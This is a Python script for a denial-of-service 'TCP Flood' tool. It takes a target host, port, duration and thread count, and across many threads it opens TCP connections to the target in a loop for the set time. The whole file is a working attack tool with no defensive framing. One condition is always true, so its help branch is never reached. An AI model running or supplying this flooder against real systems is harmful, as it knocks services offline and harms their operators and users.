import time
from sys import argv
import sys
import platform
import socket
import threading

system = platform.uname()[0]
End = '\033[0m'
help_command = """
TCP Flood:
          ./TCP_flood <Host> <Port> <Time (s)> <threadCount>
          --help
"""

def main():
    if argv[1] == argv[1]:
        try:
            host = argv[1]
            port = argv[2]
            time_input = int(argv[3])
            thread_count = int(argv[4])
            t_end = time.time() + time_input
            time.sleep(0.35)
            ip = socket.gethostbyname(host)
            print("\nUsage: Ctrl + C To Exit!!!\n")
            def run(h):
                while time.time() < t_end:
                    try:
                        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        s.connect((host,int(port)))
                        print(f"\nPacket send to {ip}:{port} {End}")
                    except Exception as e:
                        print(f"Send packet error, error : {e}")
            for i in range(thread_count):
                t = threading.Thread(target=run, args=[i])
                t.start()
        except KeyboardInterrupt:
            print("\nCtrl + C")
            print("\nStop " + "Dos !!!\n" + End)
            sys.exit()
    elif argv[1] == '--help':
        print(help_command)
        sys.exit()
    else:
        print("{} Not Found!".format(argv[1]))
        sys.exit()
if __name__ == '__main__':
    try:
        main()
    except IndexError:
        print(help_command)